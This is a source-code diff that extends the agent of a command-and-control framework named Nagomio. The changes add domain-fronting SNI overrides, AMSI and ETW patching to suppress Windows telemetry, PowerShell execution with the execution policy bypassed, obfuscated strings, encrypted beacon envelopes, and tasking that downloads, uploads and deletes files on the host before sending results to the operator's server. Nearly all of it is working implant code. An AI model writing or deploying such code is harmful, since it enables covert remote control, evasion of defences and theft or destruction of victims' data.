@@ -40,6 +40,13 @@
 #include "httplib.h"
 #include "json.hpp"
 #include "protocol.h"
+#include "wire.h"
+#include "profiles.h"
+#include "modules/registry.h"
+
+#if defined(_WIN32) && NAGOMIO_STEALTH
+#include "evade_win.h"
+#endif
 
 #if (NAGOMIO_STEALTH || NAGOMIO_ANTI_DEBUG || NAGOMIO_DAEMONIZE || NAGOMIO_ANTI_VM || NAGOMIO_ANTI_SANDBOX) && !defined(_WIN32)
 #include <sys/sysinfo.h>
@@ -343,17 +350,35 @@ namespace Nagomio {
     }
 
     void from_json(const json& j, Task& p) {
+        // A8: be defensive. If the server sends a task that is missing any
+        // of the required keys, drop the whole task rather than crashing
+        // (the teamserver's re-queue worker will eventually re-dispatch it).
+        if (!j.is_object() ||
+            !j.contains("task_id") || !j.at("task_id").is_string() ||
+            !j.contains("command") || !j.at("command").is_string() ||
+            !j.contains("arguments") || !j.at("arguments").is_array()) {
+            throw std::runtime_error("malformed task object");
+        }
         j.at("task_id").get_to(p.task_id);
         j.at("command").get_to(p.command);
         j.at("arguments").get_to(p.arguments);
     }
 
     void from_json(const json& j, BeaconReply& p) {
+        if (!j.is_object() ||
+            !j.contains("status") || !j.at("status").is_string() ||
+            !j.contains("sleep_seconds")) {
+            throw std::runtime_error("malformed beacon reply");
+        }
         j.at("status").get_to(p.status);
         j.at("sleep_seconds").get_to(p.sleep_seconds);
-        p.has_task = j.contains("task") && !j.at("task").is_null();
+        p.has_task = j.contains("task") && j.at("task").is_object();
         if (p.has_task) {
-            p.task = j.at("task").get<Task>();
+            try {
+                p.task = j.at("task").get<Task>();
+            } catch (const std::exception&) {
+                p.has_task = false;
+            }
         }
     }
 
@@ -399,6 +424,10 @@ struct AgentConfig {
 #else
     std::string user_agent = "NagomioAgent/1.0";
 #endif
+    // B4: SNI override. When set, the TLS handshake advertises this SNI
+    // even when the Host header (and TCP destination) point at a different
+    // host. Used for domain-front style deployments.
+    std::string sni_override = NAGOMIO_SNI_OVERRIDE;
 };
 
 std::string env_or_default(const char* key, const std::string& default_value) {
@@ -537,7 +566,116 @@ std::string wide_to_utf8(const std::wstring& value) {
     WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), utf8.data(), length, nullptr, nullptr);
     return utf8;
 }
+#endif
 
+// A4: per-request HMAC. The agent signs `agent_id\n<ts>\n<nonce>` with
+// HMAC-SHA256 and sends the result in `x-nagomio-ts`, `x-nagomio-mac`,
+// and `x-nagomio-nonce` headers. The nonce ensures uniqueness when
+// multiple HMACs are produced within the same second (e.g. a beacon
+// followed by its response).
+struct AuthHeaders {
+    std::string timestamp;
+    std::string nonce;
+    std::string mac;
+};
+
+static std::string to_hex(const unsigned char* data, size_t len) {
+    static const char alpha[] = "0123456789abcdef";
+    std::string out;
+    out.resize(len * 2);
+    for (size_t i = 0; i < len; ++i) {
+        out[i * 2] = alpha[(data[i] >> 4) & 0xF];
+        out[i * 2 + 1] = alpha[data[i] & 0xF];
+    }
+    return out;
+}
+
+#ifdef _WIN32
+static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::string& psk) {
+    AuthHeaders out;
+    long long ts = (long long)time(nullptr);
+    // Per-call nonce so the same second can produce many distinct HMACs.
+    // 16 hex chars = 64 bits of entropy, plenty.
+    static std::random_device rd;
+    static std::mt19937_64 gen(rd());
+    uint64_t n = gen();
+    char nbuf[20];
+    std::snprintf(nbuf, sizeof(nbuf), "%016llx", (unsigned long long)n);
+    out.timestamp = std::to_string(ts);
+    out.nonce = nbuf;
+    std::string msg = agent_id + "\n" + out.timestamp + "\n" + out.nonce;
+    // Compute HMAC-SHA256 using BCrypt.
+    BCRYPT_ALG_HANDLE alg = nullptr;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0))) {
+        return out;
+    }
+    // ipad/opad HMAC
+    std::vector<unsigned char> key(psk.begin(), psk.end());
+    if (key.size() > 64) {
+        // Hash the key first.
+        std::vector<unsigned char> h(32);
+        BCRYPT_HASH_HANDLE hh = nullptr;
+        BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0);
+        BCryptHashData(hh, key.data(), (ULONG)key.size(), 0);
+        BCryptFinishHash(hh, h.data(), (ULONG)h.size(), 0);
+        BCryptDestroyHash(hh);
+        key = h;
+    }
+    while (key.size() < 64) key.push_back(0);
+    std::vector<unsigned char> inner(64, 0x36), outer(64, 0x5C);
+    for (size_t i = 0; i < 64; ++i) {
+        inner[i] ^= key[i];
+        outer[i] ^= key[i];
+    }
+    std::vector<unsigned char> inner_data;
+    inner_data.reserve(inner.size() + msg.size());
+    inner_data.insert(inner_data.end(), inner.begin(), inner.end());
+    inner_data.insert(inner_data.end(), msg.begin(), msg.end());
+    std::vector<unsigned char> inner_hash(32);
+    BCRYPT_HASH_HANDLE hh = nullptr;
+    BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0);
+    BCryptHashData(hh, inner_data.data(), (ULONG)inner_data.size(), 0);
+    BCryptFinishHash(hh, inner_hash.data(), (ULONG)inner_hash.size(), 0);
+    BCryptDestroyHash(hh);
+    std::vector<unsigned char> outer_data;
+    outer_data.reserve(outer.size() + inner_hash.size());
+    outer_data.insert(outer_data.end(), outer.begin(), outer.end());
+    outer_data.insert(outer_data.end(), inner_hash.begin(), inner_hash.end());
+    std::vector<unsigned char> mac(32);
+    BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0);
+    BCryptHashData(hh, outer_data.data(), (ULONG)outer_data.size(), 0);
+    BCryptFinishHash(hh, mac.data(), (ULONG)mac.size(), 0);
+    BCryptDestroyHash(hh);
+    BCryptCloseAlgorithmProvider(alg, 0);
+    out.mac = to_hex(mac.data(), mac.size());
+    return out;
+}
+#else
+#include <openssl/hmac.h>
+#include <random>
+static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::string& psk) {
+    AuthHeaders out;
+    long long ts = (long long)time(nullptr);
+    static thread_local std::random_device rd;
+    static thread_local std::mt19937_64 gen(rd());
+    uint64_t n = gen();
+    char nbuf[20];
+    std::snprintf(nbuf, sizeof(nbuf), "%016llx", (unsigned long long)n);
+    out.timestamp = std::to_string(ts);
+    out.nonce = nbuf;
+    std::string msg = agent_id + "\n" + out.timestamp + "\n" + out.nonce;
+    unsigned char mac[EVP_MAX_MD_SIZE];
+    unsigned int mac_len = 0;
+    HMAC(EVP_sha256(),
+         psk.data(), (int)psk.size(),
+         reinterpret_cast<const unsigned char*>(msg.data()), msg.size(),
+         mac, &mac_len);
+    out.mac = to_hex(mac, mac_len);
+    return out;
+}
+#endif
+
+#ifdef _WIN32
 struct WinHttpHandle {
     HINTERNET handle = nullptr;
 
@@ -582,7 +720,10 @@ std::wstring combine_url_path(const URL_COMPONENTS& components, const std::strin
     return base_path + endpoint_path;
 }
 
-HttpPostResult post_json_windows(const AgentConfig& config, const std::string& endpoint, const std::string& body) {
+HttpPostResult http_request_windows(const AgentConfig& config,
+                                    const std::string& method,
+                                    const std::string& endpoint,
+                                    const std::string& body) {
     HttpPostResult result;
     std::wstring callback_url = utf8_to_wide(config.callback_url);
 
@@ -614,10 +755,20 @@ HttpPostResult post_json_windows(const AgentConfig& config, const std::string& e
     }
 
     DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
-    WinHttpHandle request(WinHttpOpenRequest(connection, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
+    std::wstring wmethod = utf8_to_wide(method);
+    WinHttpHandle request(WinHttpOpenRequest(connection, wmethod.c_str(), path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
     if (!request) {
         result.error = windows_error("WinHttpOpenRequest");
         return result;
+    }
+
+    // B4: SNI override. Sets the TLS SNI independently from the host. The
+    // HTTP Host header is whatever `host` resolved to; the TLS layer
+    // advertises the override.
+    if (secure && !config.sni_override.empty()) {
+        std::wstring sni = utf8_to_wide(config.sni_override);
+        WinHttpSetOption(request, WINHTTP_OPTION_SSL_SERVER_NAME,
+                         sni.data(), (DWORD)((sni.size() + 1) * sizeof(wchar_t)));
     }
 
     DWORD redirect_policy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
@@ -625,8 +776,16 @@ HttpPostResult post_json_windows(const AgentConfig& config, const std::string& e
 
     std::wstring headers = L"Content-Type: application/json\r\n";
     if (!config.agent_token.empty()) {
-        headers += L"x-nagomio-agent-token: ";
-        headers += utf8_to_wide(config.agent_token);
+        // A4: per-request HMAC. The principal in the HMAC is the agent_id.
+        auto auth = compute_auth_headers(config.agent_id, config.agent_token);
+        headers += L"x-nagomio-ts: ";
+        headers += utf8_to_wide(auth.timestamp);
+        headers += L"\r\n";
+        headers += L"x-nagomio-nonce: ";
+        headers += utf8_to_wide(auth.nonce);
+        headers += L"\r\n";
+        headers += L"x-nagomio-mac: ";
+        headers += utf8_to_wide(auth.mac);
         headers += L"\r\n";
     }
 
@@ -689,10 +848,31 @@ HttpPostResult post_json_windows(const AgentConfig& config, const std::string& e
     result.transport_ok = true;
     return result;
 }
+
+HttpPostResult post_json_windows(const AgentConfig& config, const std::string& endpoint, const std::string& body) {
+    return http_request_windows(config, "POST", endpoint, body);
+}
+
+HttpPostResult get_json_windows(const AgentConfig& config, const std::string& endpoint) {
+    return http_request_windows(config, "GET", endpoint, "");
+}
 #else
 HttpPostResult post_json(httplib::Client& cli, const httplib::Headers& headers, const std::string& endpoint, const std::string& body) {
     HttpPostResult result;
     if (auto res = cli.Post(endpoint, headers, body, "application/json")) {
+        result.transport_ok = true;
+        result.status = res->status;
+        result.body = res->body;
+        result.location = res->get_header_value("Location");
+    } else {
+        result.error = httplib::to_string(res.error());
+    }
+    return result;
+}
+
+HttpPostResult get_path(httplib::Client& cli, const httplib::Headers& headers, const std::string& endpoint) {
+    HttpPostResult result;
+    if (auto res = cli.Get(endpoint, headers)) {
         result.transport_ok = true;
         result.status = res->status;
         result.body = res->body;
@@ -803,6 +983,22 @@ CommandExecutionResult exec_hidden_windows(const char* cmd, int timeout_seconds)
     SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);
 
     std::string command_line = std::string(OBFSTR("cmd.exe /C ")) + cmd;
+    // B7: if the user asked for `powershell`, `pwsh`, or the task command
+    // begins with "powershell", invoke powershell.exe directly rather than
+    // going through cmd.exe. This avoids an extra process-create event and
+    // lets the AMSI/ETW patch from `evade_win.cpp` apply cleanly.
+    std::string lowered_cmd = cmd;
+    std::transform(lowered_cmd.begin(), lowered_cmd.end(), lowered_cmd.begin(),
+                   [](unsigned char ch) { return std::tolower(ch); });
+    bool is_powershell = lowered_cmd.rfind("powershell", 0) == 0 ||
+                         lowered_cmd.find(" powershell") != std::string::npos;
+    LPCSTR exe_path = nullptr;
+    std::string ps_args;
+    if (is_powershell) {
+        exe_path = "powershell.exe";
+        ps_args = std::string("-NoProfile -ExecutionPolicy Bypass -Command ") + cmd;
+        command_line = ps_args;
+    }
     STARTUPINFOA startup_info{};
     startup_info.cb = sizeof(STARTUPINFOA);
     startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -813,7 +1009,7 @@ CommandExecutionResult exec_hidden_windows(const char* cmd, int timeout_seconds)
 
     PROCESS_INFORMATION process_info{};
     BOOL created = CreateProcessA(
-        nullptr,
+        exe_path,
         command_line.data(),
         nullptr,
         nullptr,
@@ -902,7 +1098,13 @@ CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
         dup2(pipe_fds[1], STDOUT_FILENO);
         dup2(pipe_fds[1], STDERR_FILENO);
         close(pipe_fds[1]);
-        execl(OBFSTR("/bin/sh").c_str(), OBFSTR("sh").c_str(), OBFSTR("-c").c_str(), cmd, static_cast<char*>(nullptr));
+        // OBFSTR returns a temporary std::string; materialise into locals so the
+        // pointers stay valid across the variadic execl call (avoids dangling
+        // .c_str() UB under NAGOMIO_XOR_CONFIG=ON).
+        std::string sh_bin = OBFSTR("/bin/sh");
+        std::string sh_arg0 = OBFSTR("sh");
+        std::string sh_arg1 = OBFSTR("-c");
+        execl(sh_bin.c_str(), sh_arg0.c_str(), sh_arg1.c_str(), cmd, static_cast<char*>(nullptr));
         _exit(127);
     }
 
@@ -1095,7 +1297,7 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
 
     try {
         json result;
-        if (task.command == OBFSTR("__nagomio_file_list")) {
+        if (task.command == OBFSTR("file_list")) {
             std::filesystem::path path = task.arguments.empty()
                 ? std::filesystem::current_path()
                 : std::filesystem::path(task.arguments[0]);
@@ -1114,7 +1316,7 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
                     {"size", size}
                 });
             }
-        } else if (task.command == OBFSTR("__nagomio_file_download")) {
+        } else if (task.command == OBFSTR("file_download")) {
             if (task.arguments.empty()) {
                 throw std::runtime_error(OBFSTR("remote path is required").c_str());
             }
@@ -1127,7 +1329,7 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
                 {OBFSTR("size"), bytes.size()},
                 {OBFSTR("content_base64"), base64_encode(bytes)}
             };
-        } else if (task.command == OBFSTR("__nagomio_file_upload")) {
+        } else if (task.command == OBFSTR("file_upload")) {
             if (task.arguments.size() < 2) {
                 throw std::runtime_error(OBFSTR("remote path and file content are required").c_str());
             }
@@ -1141,14 +1343,14 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
             }
             write_file_bytes(path, bytes);
             result = json{{OBFSTR("type"), OBFSTR("file_upload")}, {OBFSTR("path"), path.string()}, {OBFSTR("size"), bytes.size()}};
-        } else if (task.command == OBFSTR("__nagomio_file_delete")) {
+        } else if (task.command == OBFSTR("file_delete")) {
             if (task.arguments.empty()) {
                 throw std::runtime_error(OBFSTR("remote path is required").c_str());
             }
             std::filesystem::path path = task.arguments[0];
             auto removed = std::filesystem::remove_all(path);
             result = json{{OBFSTR("type"), OBFSTR("file_delete")}, {OBFSTR("path"), path.string()}, {OBFSTR("removed"), removed}};
-        } else if (task.command == OBFSTR("__nagomio_file_rename")) {
+        } else if (task.command == OBFSTR("file_rename")) {
             if (task.arguments.size() < 2) {
                 throw std::runtime_error(OBFSTR("source and destination paths are required").c_str());
             }
@@ -1156,7 +1358,7 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
             std::filesystem::path destination = task.arguments[1];
             std::filesystem::rename(source, destination);
             result = json{{OBFSTR("type"), OBFSTR("file_rename")}, {OBFSTR("source"), source.string()}, {OBFSTR("destination"), destination.string()}};
-        } else if (task.command == OBFSTR("__nagomio_file_mkdir")) {
+        } else if (task.command == OBFSTR("file_mkdir")) {
             if (task.arguments.empty()) {
                 throw std::runtime_error(OBFSTR("remote path is required").c_str());
             }
@@ -1178,8 +1380,27 @@ Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::s
 }
 
 Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string& agent_id, int timeout_seconds) {
-    if (task.command.rfind(OBFSTR("__nagomio_file_"), 0) == 0) {
+    if (task.command == OBFSTR("file_list") ||
+        task.command == OBFSTR("file_download") ||
+        task.command == OBFSTR("file_upload") ||
+        task.command == OBFSTR("file_delete") ||
+        task.command == OBFSTR("file_rename") ||
+        task.command == OBFSTR("file_mkdir")) {
         return execute_file_task(task, agent_id);
+    }
+
+    if (nagomio_modules::is_known_module(task.command)) {
+        Nagomio::AgentResponse agent_res;
+        agent_res.agent_id = agent_id;
+        agent_res.task_id = task.task_id;
+        try {
+            agent_res.output = nagomio_modules::dispatch(task, agent_id);
+            agent_res.status = OBFSTR("success");
+        } catch (const std::exception& e) {
+            agent_res.output = e.what();
+            agent_res.status = OBFSTR("error");
+        }
+        return agent_res;
     }
 
     Nagomio::AgentResponse agent_res;
@@ -1221,36 +1442,115 @@ int main(int argc, char** argv) {
     std::cout << "Nagomio C2 Agent Starting..." << std::endl;
     AgentConfig config = parse_config(argc, argv);
 
+#if defined(_WIN32) && NAGOMIO_STEALTH
+    // B5: patch AMSI + ETW at startup so the powershell task path doesn't
+    // emit any scriptblock / provider telemetry.
+    nagomio_evade::apply_all();
+#endif
+
+    // B2: load the configured callback profile.
+    nagomio::set_profile_by_name(NAGOMIO_PROFILE);
+
     Nagomio::AgentRegistration reg;
     reg.agent_id = config.agent_id.empty() ? default_agent_id() : config.agent_id;
     reg.hostname = get_hostname();
     reg.os = get_os_name();
     reg.architecture = get_architecture();
+#ifdef _WIN32
+    reg.pid = (unsigned int)GetCurrentProcessId();
+    reg.integrity = "user";
+    reg.is_elevated = false;
+#else
+    reg.pid = (unsigned int)getpid();
+    reg.integrity = (geteuid() == 0) ? "root" : "user";
+    reg.is_elevated = (geteuid() == 0);
+#endif
 
 #ifndef _WIN32
     httplib::Client cli(config.callback_url);
     cli.set_connection_timeout(5, 0);
     cli.set_follow_location(true);
-    httplib::Headers headers;
-    if (!config.agent_token.empty()) {
-        headers.emplace(OBFSTR("x-nagomio-agent-token"), config.agent_token);
-    }
-    headers.emplace(OBFSTR("User-Agent"), config.user_agent);
+    // B2: use the profile's user agent when one is configured.
+    std::string ua = nagomio::active_profile().user_agent.empty()
+                         ? config.user_agent
+                         : nagomio::active_profile().user_agent;
 #endif
 
     while (true) {
+        // A4: per-request HMAC. Compute fresh on each loop iteration so
+        // the teamserver's replay cache accepts every beacon.
+        httplib::Headers headers;
+        if (!config.agent_token.empty()) {
+            auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
+            headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+            headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+            headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+        }
+#ifndef _WIN32
+        headers.emplace(OBFSTR("User-Agent"), ua);
+#endif
+
         Nagomio::BeaconRequest beacon{reg};
         json j_beacon = beacon;
+        std::string beacon_body = j_beacon.dump();
+        // B2: wrap in profile body template (e.g. {"batch":[{"m":...}]}).
+        beacon_body = nagomio::wrap_beacon(beacon_body);
+        // B1: seal in the wire envelope.
+#if NAGOMIO_WIRE_ENCRYPTION
+        if (!config.agent_token.empty()) {
+            std::vector<unsigned char> nonce, ct, tag;
+            nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
+                               std::vector<unsigned char>(beacon_body.begin(), beacon_body.end()),
+                               nonce, ct, tag);
+            beacon_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+        }
+#endif
+        // B11: dead-drop profile uses GET and appends the agent_id to the
+        // path. The body is irrelevant on a GET so we leave it empty when
+        // the body is going to be discarded by the server anyway.
+        std::string beacon_path = nagomio::beacon_path();
+        if (nagomio::beacon_method() == "GET") {
+            beacon_path += "/" + reg.agent_id;
+            beacon_body.clear();
+        }
 
 #ifdef _WIN32
-        HttpPostResult res = post_json_windows(config, OBFSTR("/beacon"), j_beacon.dump());
+        HttpPostResult res;
+        if (nagomio::beacon_method() == "GET") {
+            res = get_json_windows(config, beacon_path);
+        } else {
+            res = post_json_windows(config, beacon_path, beacon_body);
+        }
 #else
-        HttpPostResult res = post_json(cli, headers, OBFSTR("/beacon"), j_beacon.dump());
+        HttpPostResult res;
+        if (nagomio::beacon_method() == "GET") {
+            res = get_path(cli, headers, beacon_path);
+        } else {
+            res = post_json(cli, headers, beacon_path, beacon_body);
+        }
 #endif
         if (res.transport_ok) {
-            if (res.status == 200 && !res.body.empty()) {
+            std::string inner = res.body;
+            // B1: open the wire envelope.
+#if NAGOMIO_WIRE_ENCRYPTION
+            if (!config.agent_token.empty()) {
+                std::string ctx;
+                std::vector<unsigned char> nonce, ct, tag;
+                if (nagomio_wire::try_decode_envelope(inner, ctx, nonce, ct, tag)) {
+                    std::vector<unsigned char> plain;
+                    if (!nagomio_wire::open(config.agent_token, ctx, nonce, ct, tag, plain)) {
+                        std::cerr << "[-] Wire envelope tag mismatch on beacon response" << std::endl;
+                    } else {
+                        inner.assign(plain.begin(), plain.end());
+                    }
+                }
+            }
+#endif
+            // B2: unwrap profile body.
+            inner = nagomio::unwrap_response(inner);
+            if (res.status == 200 && !inner.empty()) {
                 try {
-                    json response_json = json::parse(res.body);
+                    json response_json = json::parse(inner);
                     Nagomio::BeaconReply reply = response_json.get<Nagomio::BeaconReply>();
                     if (reply.sleep_seconds > 0) {
                         config.sleep_seconds = reply.sleep_seconds;
@@ -1264,16 +1564,39 @@ int main(int argc, char** argv) {
                         std::cout << "[*] Task output size: " << agent_res.output.size() << " bytes." << std::endl;
 
                         json j_res = agent_res;
+                        std::string res_body = j_res.dump();
+#if NAGOMIO_WIRE_ENCRYPTION
+                        if (!config.agent_token.empty()) {
+                            std::vector<unsigned char> nonce, ct, tag;
+                            nagomio_wire::seal(config.agent_token, "nagomio/server/v1",
+                                               std::vector<unsigned char>(res_body.begin(), res_body.end()),
+                                               nonce, ct, tag);
+                            res_body = nagomio_wire::encode_envelope("nagomio/server/v1", nonce, ct, tag);
+                        }
+#endif
+                        // A4: the response needs its own fresh HMAC since the
+                        // teamserver's replay cache would otherwise reject
+                        // the second request as a replay of the beacon.
+                        httplib::Headers res_headers = headers;
+                        if (!config.agent_token.empty()) {
+                            auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
+                            res_headers.erase(OBFSTR("x-nagomio-ts"));
+                            res_headers.erase(OBFSTR("x-nagomio-nonce"));
+                            res_headers.erase(OBFSTR("x-nagomio-mac"));
+                            res_headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+                            res_headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+                            res_headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+                        }
 #ifdef _WIN32
-                        post_json_windows(config, OBFSTR("/response"), j_res.dump());
+                        post_json_windows(config, nagomio::response_path(), res_body);
 #else
-                        post_json(cli, headers, OBFSTR("/response"), j_res.dump());
+                        post_json(cli, res_headers, nagomio::response_path(), res_body);
 #endif
                     }
                 } catch (const std::exception& e) {
                     std::cerr << "[-] Error parsing beacon reply: " << e.what() << std::endl;
                 }
-            } else {
+            } else if (res.status != 200) {
                 std::cerr << "[-] Beacon rejected with HTTP " << res.status;
                 if (res.status >= 300 && res.status < 400) {
                     std::cerr << " redirect";
